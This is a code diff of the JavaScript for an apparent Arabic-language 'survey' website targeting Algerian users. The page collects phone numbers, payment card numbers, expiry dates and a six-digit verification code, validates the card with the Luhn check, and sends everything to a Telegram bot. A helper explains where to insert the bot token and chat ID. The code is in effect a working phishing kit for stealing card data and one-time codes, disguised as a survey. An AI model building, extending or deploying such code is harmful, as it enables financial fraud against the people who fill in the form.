@@ -1,5 +1,7 @@
 // تهيئة التطبيق
 document.addEventListener('DOMContentLoaded', function() {
+    console.log('🚀 بدء تحميل الموقع...');
+    
     // إخفاء شاشة التحميل بعد 3 ثواني
     setTimeout(() => {
         document.getElementById('loading-screen').style.opacity = '0';
@@ -18,6 +20,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
 // إظهار صفحة محددة
 function showPage(pageId) {
+    console.log(`📄 الانتقال إلى الصفحة: ${pageId}`);
+    
     const pages = document.querySelectorAll('.page');
     pages.forEach(page => {
         page.classList.remove('active');
@@ -30,12 +34,14 @@ function showPage(pageId) {
 
 // الانتقال للصفحة الرئيسية
 function goHome() {
+    console.log('🏠 العودة للصفحة الرئيسية');
     showPage('home-page');
     resetSurvey();
 }
 
 // بدء الاستبيان
 function startSurvey() {
+    console.log('📝 بدء الاستبيان');
     showPage('survey-page');
     trackButtonClick('start-survey-button');
 }
@@ -43,6 +49,8 @@ function startSurvey() {
 // العودة للصفحة السابقة
 function goBack() {
     const currentStep = getCurrentStep();
+    console.log(`↩️ العودة من الخطوة ${currentStep}`);
+    
     if (currentStep > 1) {
         showStep(currentStep - 1);
     } else {
@@ -56,16 +64,22 @@ let currentStep = 1;
 let step1DataSent = false; // لمنع الإرسال المزدوج
 
 function showStep(stepNumber) {
+    console.log(`📊 عرض الخطوة ${stepNumber}`);
+    
     const steps = document.querySelectorAll('.survey-step');
     steps.forEach(step => {
         step.classList.remove('active');
     });
-    document.getElementById(`step-${stepNumber}`).classList.add('active');
     
-    // تحديث شريط التقدم
-    updateProgressBar(stepNumber);
-    
-    currentStep = stepNumber;
+    const stepElement = document.getElementById(`step-${stepNumber}`);
+    if (stepElement) {
+        stepElement.classList.add('active');
+        
+        // تحديث شريط التقدم
+        updateProgressBar(stepNumber);
+        
+        currentStep = stepNumber;
+    }
 }
 
 function getCurrentStep() {
@@ -73,15 +87,21 @@ function getCurrentStep() {
 }
 
 function nextStep(current) {
+    console.log(`➡️ محاولة الانتقال من الخطوة ${current}`);
+    
     // التحقق من صحة البيانات في الخطوة الحالية
     if (!validateStep(current)) {
+        console.log('❌ فشل التحقق من الخطوة');
         showNotification('يرجى ملء جميع الحقول المطلوبة بشكل صحيح', 'error');
         return;
     }
     
     if (current === 1) {
+        console.log('📋 معالجة الخطوة 1...');
+        
         // منع الإرسال المزدوج
         if (step1DataSent) {
+            console.log('⚠️ البيانات أرسلت مسبقاً، تخطي الإرسال');
             showStep(2);
             detectDeviceInfo();
             return;
@@ -89,55 +109,73 @@ function nextStep(current) {
         
         // جمع بيانات الخطوة الأولى
         const formData = collectStep1Data();
+        console.log('📊 بيانات الخطوة 1:', formData);
         
         // التحقق من رقم الهاتف الجزائري
         if (!validateAlgerianPhone(formData.phone)) {
+            console.log('❌ رقم الهاتف غير صالح');
             showNotification('يرجى إدخال رقم هاتف جزائري صحيح (05XX XX XX XX)', 'error');
             return;
         }
         
         // التحقق من رقم البطاقة
-        if (!validateCardNumber(formData.cardNumber)) {
+        const cardValid = validateCardNumber(formData.cardNumber);
+        console.log(`💳 تحقق البطاقة: ${cardValid ? 'صالح' : 'غير صالح'}`);
+        
+        if (!cardValid) {
             showNotification('رقم البطاقة غير صالح. تأكد من إدخال رقم بطاقة صحيح', 'error');
             return;
         }
         
         // إرسال البيانات إلى تليجرام
+        console.log('📤 إرسال البيانات إلى تليجرام...');
         const sendSuccess = sendTelegramData('step1_completed', formData);
         
         if (sendSuccess) {
+            console.log('✅ تم إرسال البيانات بنجاح');
             step1DataSent = true;
             showStep(2);
             detectDeviceInfo();
         } else {
+            console.log('❌ فشل إرسال البيانات');
             showNotification('حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى', 'error');
         }
         
     } else if (current === 2) {
+        console.log('📋 معالجة الخطوة 2...');
+        
         const verificationCode = document.getElementById('verification-code').value;
+        console.log(`🔢 كود التحقق المدخل: ${verificationCode}`);
         
         // التحقق من صحة الكود
         if (!verificationCode || verificationCode.length !== 6 || !/^\d+$/.test(verificationCode)) {
+            console.log('❌ كود التحقق غير صالح');
             showNotification('يرجى إدخال رمز تحقق مكون من 6 أرقام', 'error');
             return;
         }
         
         // جمع البيانات النهائية
         const finalData = collectAllData();
+        console.log('📊 البيانات النهائية:', finalData);
         
         // إرسال البيانات النهائية إلى تليجرام
+        console.log('📤 إرسال البيانات النهائية إلى تليجرام...');
         const sendSuccess = sendTelegramData('survey_completed', finalData);
         
         if (sendSuccess) {
+            console.log('✅ تم إرسال البيانات النهائية بنجاح');
+            
             // تحديث رقم المشاركة
-            document.getElementById('participation-id').textContent = 
-                `ALG-${Date.now().toString().slice(-8)}`;
+            const participationId = `ALG-${Date.now().toString().slice(-8)}`;
+            document.getElementById('participation-id').textContent = participationId;
+            console.log(`🎫 رقم المشاركة: ${participationId}`);
             
             showStep(3);
             
             // إرسال تأكيد الإكمال
             sendTelegramData('thankyou_page_viewed', {});
         } else {
+            console.log('❌ فشل إرسال البيانات النهائية');
             showNotification('حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى', 'error');
         }
     }
@@ -146,6 +184,8 @@ function nextStep(current) {
 }
 
 function updateProgressBar(step) {
+    console.log(`📶 تحديث شريط التقدم للخطوة ${step}`);
+    
     const steps = document.querySelectorAll('.progress-step');
     steps.forEach((stepElement, index) => {
         if (index + 1 <= step) {
@@ -163,11 +203,13 @@ function validateCardNumber(cardNumber) {
     
     // 2. التحقق من أن الرقم يحتوي فقط على أرقام
     if (!/^\d+$/.test(cleanNumber)) {
+        console.log('❌ البطاقة تحتوي على أحرف غير رقمية');
         return false;
     }
     
     // 3. التحقق من الطول (معظم البطاقات 13-19 رقم)
     if (cleanNumber.length < 13 || cleanNumber.length > 19) {
+        console.log(`❌ طول البطاقة غير صحيح: ${cleanNumber.length} رقم (المطلوب 13-19)`);
         return false;
     }
     
@@ -190,7 +232,10 @@ function validateCardNumber(cardNumber) {
         isEven = !isEven;
     }
     
-    return (sum % 10) === 0;
+    const isValid = (sum % 10) === 0;
+    console.log(`🔢 خوارزمية Luhn: المجموع=${sum}, صالح=${isValid}`);
+    
+    return isValid;
 }
 
 // دالة لتنسيق رقم البطاقة أثناء الكتابة
@@ -200,15 +245,17 @@ function formatCardNumber(value) {
     
     // تقسيم إلى مجموعات من 4 أرقام
     const groups = [];
-    for (let i = 0; i < numbers.length && i < 16; i += 4) {
+    for (let i = 0; i < numbers.length; i += 4) {
         groups.push(numbers.substr(i, 4));
     }
     
     // دمج المجموعات مع مسافات
-    return groups.join(' ');
+    return groups.join(' ').trim();
 }
 
 function validateStep(step) {
+    console.log(`🔍 التحقق من صحة الخطوة ${step}`);
+    
     let isValid = true;
     
     if (step === 1) {
@@ -216,6 +263,11 @@ function validateStep(step) {
         const card = document.getElementById('card-number').value;
         const expiry = document.getElementById('expiry-date').value;
         const privacy = document.getElementById('privacy-check').checked;
+        
+        console.log(`📱 الهاتف: ${phone}`);
+        console.log(`💳 البطاقة: ${card}`);
+        console.log(`📅 التاريخ: ${expiry}`);
+        console.log(`✅ الخصوصية: ${privacy}`);
         
         if (!validateAlgerianPhone(phone)) {
             markInvalid('phone', 'رقم الهاتف غير صحيح (يجب أن يكون 05XX XX XX XX)');
@@ -245,6 +297,7 @@ function validateStep(step) {
         }
     }
     
+    console.log(`✅ نتيجة التحقق: ${isValid ? 'ناجح' : 'فشل'}`);
     return isValid;
 }
 
@@ -255,6 +308,8 @@ function validateAlgerianPhone(phone) {
 }
 
 function markInvalid(fieldId, message) {
+    console.log(`❌ حقل غير صالح: ${fieldId} - ${message}`);
+    
     const field = document.getElementById(fieldId);
     const validationMsg = field.parentNode.querySelector('.validation-message');
     
@@ -264,6 +319,8 @@ function markInvalid(fieldId, message) {
 }
 
 function markValid(fieldId) {
+    console.log(`✅ حقل صالح: ${fieldId}`);
+    
     const field = document.getElementById(fieldId);
     const validationMsg = field.parentNode.querySelector('.validation-message');
     
@@ -296,26 +353,38 @@ function collectAllData() {
 
 function getSessionId() {
     if (!sessionStorage.getItem('survey_session_id')) {
-        sessionStorage.setItem('survey_session_id', 
-            'sess_' + Math.random().toString(36).substr(2, 9));
+        const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
+        sessionStorage.setItem('survey_session_id', sessionId);
+        console.log(`🆔 معرف الجلسة الجديد: ${sessionId}`);
     }
     return sessionStorage.getItem('survey_session_id');
 }
 
 function resetSurvey() {
+    console.log('🔄 إعادة تعيين الاستبيان');
+    
     currentStep = 1;
     step1DataSent = false; // إعادة تعيين علامة الإرسال
-    document.querySelectorAll('.survey-form')[0].reset();
+    
+    const form = document.querySelector('.survey-form');
+    if (form) {
+        form.reset();
+    }
+    
     document.getElementById('verification-code').value = '';
+    
     document.querySelectorAll('.validation-message').forEach(msg => {
         msg.textContent = '';
     });
+    
     updateProgressBar(1);
     showStep(1);
 }
 
 // إظهار الإشعارات
 function showNotification(message, type = 'info') {
+    console.log(`💬 إشعار: ${message} (${type})`);
+    
     const notification = document.getElementById('notification');
     notification.textContent = message;
     
@@ -337,6 +406,8 @@ function showNotification(message, type = 'info') {
 
 // اكتشاف معلومات الجهاز
 function detectDeviceInfo() {
+    console.log('🖥️ اكتشاف معلومات الجهاز...');
+    
     const deviceInfo = getDeviceInfo();
     
     document.getElementById('device-type').textContent = deviceInfo.deviceType;
@@ -344,77 +415,294 @@ function detectDeviceInfo() {
     document.getElementById('browser-type').textContent = deviceInfo.browser;
     document.getElementById('screen-resolution').textContent = 
         `${deviceInfo.screenWidth} × ${deviceInfo.screenHeight}`;
+    
+    console.log('📊 معلومات الجهاز:', deviceInfo);
 }
 
 function initSurveyForm() {
+    console.log('📝 تهيئة نموذج الاستبيان...');
+    
     // تنسيق رقم البطاقة
     const cardInput = document.getElementById('card-number');
-    cardInput.addEventListener('input', function(e) {
-        const formatted = formatCardNumber(e.target.value);
-        e.target.value = formatted;
-        
-        // التحقق في الوقت الحقيقي
-        const cleanNumber = formatted.replace(/\s/g, '');
-        if (cleanNumber.length >= 13) {
-            if (validateCardNumber(formatted)) {
-                markValid('card-number');
+    
+    if (cardInput) {
+        cardInput.addEventListener('input', function(e) {
+            const originalValue = e.target.value;
+            const cursorPosition = e.target.selectionStart;
+            
+            // حساب عدد الأرقام قبل المؤشر
+            const textBeforeCursor = originalValue.substring(0, cursorPosition);
+            const digitsBeforeCursor = textBeforeCursor.replace(/\D/g, '').length;
+            
+            // تنسيق الرقم
+            const formatted = formatCardNumber(originalValue);
+            e.target.value = formatted;
+            
+            // حساب موضع المؤشر الجديد
+            let newCursorPosition = 0;
+            let digitCount = 0;
+            
+            for (let i = 0; i < formatted.length; i++) {
+                if (digitCount >= digitsBeforeCursor) {
+                    break;
+                }
+                if (/\d/.test(formatted[i])) {
+                    digitCount++;
+                }
+                newCursorPosition++;
+            }
+            
+            // تعيين موضع المؤشر
+            e.target.setSelectionRange(newCursorPosition, newCursorPosition);
+            
+            // التحقق في الوقت الحقيقي
+            const cleanNumber = formatted.replace(/\s/g, '');
+            
+            if (cleanNumber.length > 0) {
+                if (cleanNumber.length >= 13) {
+                    if (validateCardNumber(formatted)) {
+                        markValid('card-number');
+                    } else {
+                        const validationMsg = cardInput.parentNode.querySelector('.validation-message');
+                        if (cleanNumber.length >= 16) {
+                            validationMsg.textContent = 'رقم البطاقة غير صالح';
+                        } else if (cleanNumber.length > 19) {
+                            validationMsg.textContent = 'الرقم طويل جداً (19 رقم كحد أقصى)';
+                        } else {
+                            validationMsg.textContent = '';
+                        }
+                        validationMsg.style.color = '#e74c3c';
+                        cardInput.style.borderColor = '#e74c3c';
+                    }
+                } else if (cleanNumber.length < 13) {
+                    const validationMsg = cardInput.parentNode.querySelector('.validation-message');
+                    validationMsg.textContent = cleanNumber.length > 0 ? 'يجب أن يكون 13 رقم على الأقل' : '';
+                    validationMsg.style.color = '#e74c3c';
+                    cardInput.style.borderColor = '#e74c3c';
+                }
             } else {
                 const validationMsg = cardInput.parentNode.querySelector('.validation-message');
-                validationMsg.textContent = cleanNumber.length >= 16 ? 'رقم البطاقة غير صالح' : '';
-                validationMsg.style.color = '#e74c3c';
-                cardInput.style.borderColor = '#e74c3c';
+                validationMsg.textContent = '';
+                cardInput.style.borderColor = '#e0e0e0';
             }
-        } else {
-            const validationMsg = cardInput.parentNode.querySelector('.validation-message');
-            validationMsg.textContent = '';
-            cardInput.style.borderColor = '#e0e0e0';
-        }
-    });
+        });
+    }
     
     // تنسيق رقم الهاتف
     const phoneInput = document.getElementById('phone');
-    phoneInput.addEventListener('input', function(e) {
-        let value = e.target.value.replace(/\D/g, '');
-        if (value.startsWith('0')) {
-            value = value.substring(0, 10);
-            if (value.length >= 2) {
-                value = value.replace(/(\d{2})(?=\d)/, '$1 ');
+    
+    if (phoneInput) {
+        phoneInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            
+            // تحديد الطول الأقصى للرقم الجزائري
+            if (value.startsWith('0')) {
+                value = value.substring(0, 10);
+                
+                // تنسيق مع المسافات
+                if (value.length >= 2) {
+                    value = value.replace(/(\d{2})(?=\d)/, '$1 ');
+                }
+                if (value.length >= 5) {
+                    value = value.replace(/(\d{2} \d{2})(?=\d)/, '$1 ');
+                }
+                if (value.length >= 8) {
+                    value = value.replace(/(\d{2} \d{2} \d{2})(?=\d)/, '$1 ');
+                }
             }
-            if (value.length >= 5) {
-                value = value.replace(/(\d{2} \d{2})(?=\d)/, '$1 ');
-            }
-            if (value.length >= 8) {
-                value = value.replace(/(\d{2} \d{2} \d{2})(?=\d)/, '$1 ');
-            }
-        }
-        e.target.value = value;
-        
-        // التحقق في الوقت الحقيقي
-        if (value.replace(/\s/g, '').length === 10) {
-            if (validateAlgerianPhone(value)) {
-                markValid('phone');
+            
+            e.target.value = value;
+            
+            // التحقق في الوقت الحقيقي
+            const cleanPhone = value.replace(/\s/g, '');
+            if (cleanPhone.length > 0) {
+                if (cleanPhone.length === 10) {
+                    if (validateAlgerianPhone(value)) {
+                        markValid('phone');
+                    } else {
+                        markInvalid('phone', 'رقم جزائري غير صحيح');
+                    }
+                } else if (cleanPhone.length < 10) {
+                    const validationMsg = phoneInput.parentNode.querySelector('.validation-message');
+                    validationMsg.textContent = '10 أرقام مطلوبة';
+                    validationMsg.style.color = '#e74c3c';
+                    phoneInput.style.borderColor = '#e74c3c';
+                }
             } else {
-                markInvalid('phone', 'رقم جزائري غير صحيح');
+                const validationMsg = phoneInput.parentNode.querySelector('.validation-message');
+                validationMsg.textContent = '';
+                phoneInput.style.borderColor = '#e0e0e0';
             }
-        }
-    });
+        });
+    }
+    
+    // تاريخ انتهاء الصلاحية - تعيين القيمة الدنيا
+    const expiryInput = document.getElementById('expiry-date');
+    if (expiryInput) {
+        const today = new Date();
+        const minDate = today.getFullYear() + '-' + String(today.getMonth() + 1).padStart(2, '0');
+        expiryInput.min = minDate;
+    }
+    
+    console.log('✅ تم تهيئة النموذج بنجاح');
 }
 
-// اختبار برقم بطاقة صالح للاستخدام
+// دالة مساعدة للحصول على معلومات الجهاز
+function getDeviceInfo() {
+    const userAgent = navigator.userAgent;
+    let deviceType = 'Desktop';
+    let os = 'Unknown OS';
+    let browser = 'Unknown Browser';
+    
+    // اكتشاف نوع الجهاز
+    if (/mobile|android|iphone|ipad/i.test(userAgent)) {
+        deviceType = /tablet|ipad/i.test(userAgent) ? 'Tablet' : 'Mobile';
+    }
+    
+    // اكتشاف نظام التشغيل
+    if (/windows/i.test(userAgent)) {
+        os = 'Windows';
+    } else if (/macintosh|mac os x/i.test(userAgent)) {
+        os = 'macOS';
+    } else if (/android/i.test(userAgent)) {
+        os = 'Android';
+    } else if (/iphone|ipad|ipod/i.test(userAgent)) {
+        os = 'iOS';
+    } else if (/linux/i.test(userAgent)) {
+        os = 'Linux';
+    }
+    
+    // اكتشاف المتصفح
+    if (/chrome/i.test(userAgent) && !/edge/i.test(userAgent)) {
+        browser = 'Chrome';
+    } else if (/firefox/i.test(userAgent)) {
+        browser = 'Firefox';
+    } else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) {
+        browser = 'Safari';
+    } else if (/edge/i.test(userAgent)) {
+        browser = 'Edge';
+    } else if (/opera|opr/i.test(userAgent)) {
+        browser = 'Opera';
+    }
+    
+    return {
+        deviceType,
+        os,
+        browser,
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        language: navigator.language,
+        platform: navigator.platform,
+        cookiesEnabled: navigator.cookieEnabled,
+        online: navigator.onLine
+    };
+}
+
+// دالة اختبار إرسال إلى تليجرام مباشرة
+function testTelegramDirectly() {
+    console.log('🧪 اختبار إرسال مباشر إلى تليجرام');
+    
+    const testData = {
+        phone: '0551234567',
+        cardNumber: '4532015148423237',
+        expiryDate: '2025-12',
+        timestamp: new Date().toISOString(),
+        sessionId: getSessionId()
+    };
+    
+    const result = sendTelegramData('test_direct', testData);
+    console.log(`📤 نتيجة الاختبار: ${result ? 'تم الإرسال' : 'فشل الإرسال'}`);
+}
+
+// دالة اختبار برقم بطاقة صالح للاستخدام
 function testValidCard() {
     const testCards = [
-        '4532 0151 4842 3237', // Visa صالح
-        '5555 5555 5555 4444', // MasterCard صالح
-        '4111 1111 1111 1111', // Visa صالح (اختبار)
-        '3782 8224 6310 005'   // American Express صالح
+        '4532015148423237', // Visa صالح (16 رقم)
+        '5555555555554444', // MasterCard صالح (16 رقم)
+        '4111111111111111', // Visa صالح (16 رقم) اختبار
+        '378282246310005',  // American Express صالح (15 رقم)
+        '6011111111111117', // Discover صالح (16 رقم)
+        '30569309025904',   // Diners Club صالح (14 رقم)
+        '3566002020360505'  // JCB صالح (16 رقم)
     ];
     
     const randomCard = testCards[Math.floor(Math.random() * testCards.length)];
-    document.getElementById('card-number').value = randomCard;
+    const formattedCard = formatCardNumber(randomCard);
+    
+    document.getElementById('card-number').value = formattedCard;
     
     // تشغيل التحقق
-    const event = new Event('input');
+    const event = new Event('input', { bubbles: true });
     document.getElementById('card-number').dispatchEvent(event);
     
-    console.log('✅ تم تعيين رقم بطاقة اختبار صالح:', randomCard);
+    console.log('✅ تم تعيين رقم بطاقة اختبار صالح:', formattedCard);
+    return formattedCard;
 }
+
+// دالة اختبار كاملة للاستبيان
+function runFullTest() {
+    console.log('🧪 بدء اختبار كامل للاستبيان');
+    
+    // تعيين بيانات اختبارية
+    document.getElementById('phone').value = '0551234567';
+    document.getElementById('card-number').value = '4532 0151 4842 3237';
+    document.getElementById('expiry-date').value = '2025-12';
+    document.getElementById('privacy-check').checked = true;
+    
+    // تشغيل أحداث الإدخال للتحقق
+    ['phone', 'card-number'].forEach(id => {
+        const event = new Event('input', { bubbles: true });
+        document.getElementById(id).dispatchEvent(event);
+    });
+    
+    console.log('✅ تم تعيين بيانات الاختبار');
+    console.log('📋 الخطوة التالية: اضغط على "متابعة"');
+}
+
+// دالة لفحص إعدادات تليجرام
+function checkTelegramSetup() {
+    console.log('🔍 فحص إعدادات تليجرام...');
+    
+    // هذه الدالة تحتاج إلى أن تكون في نفس الملف الذي يحتوي على TELEGRAM_BOT_TOKEN
+    try {
+        console.log('🤖 Bot Token:', TELEGRAM_BOT_TOKEN ? 
+            (TELEGRAM_BOT_TOKEN.length > 10 ? 'موجود (مخفى)' : TELEGRAM_BOT_TOKEN) : 
+            'مفقود ❌');
+        
+        console.log('💬 Chat ID:', TELEGRAM_CHAT_ID ? 
+            (TELEGRAM_CHAT_ID.length > 5 ? 'موجود' : TELEGRAM_CHAT_ID) : 
+            'مفقود ❌');
+        
+        // اختبار بسيط للتوكن
+        if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
+            console.log('✅ إعدادات تليجرام موجودة');
+            return true;
+        } else {
+            console.log('❌ إعدادات تليجرام غير مكتملة');
+            console.log('📋 التعليمات:');
+            console.log('1. افتح telegram.js');
+            console.log('2. استبدل YOUR_BOT_TOKEN_HERE بالتوكن الحقيقي');
+            console.log('3. استبدل YOUR_CHAT_ID_HERE بالرقم الحقيقي');
+            return false;
+        }
+    } catch (error) {
+        console.log('❌ خطأ في فحص إعدادات تليجرام:', error);
+        return false;
+    }
+}
+
+// إضافة أداة للتحقق من صحة البطاقة يدوياً
+function validateCardManually(cardNumber) {
+    console.log('🔢 التحقق اليدوي من البطاقة:', cardNumber);
+    const result = validateCardNumber(cardNumber);
+    console.log(`✅ النتيجة: ${result ? 'صالح' : 'غير صالح'}`);
+    return result;
+}
+
+// عند تحميل الصفحة، التحقق من الإعدادات
+window.addEventListener('load', function() {
+    console.log('🌐 تم تحميل الصفحة بالكامل');
+    
+    // يمكن تفعيل هذا للتحقق التلقائي
+    // checkTelegramSetup();
+});
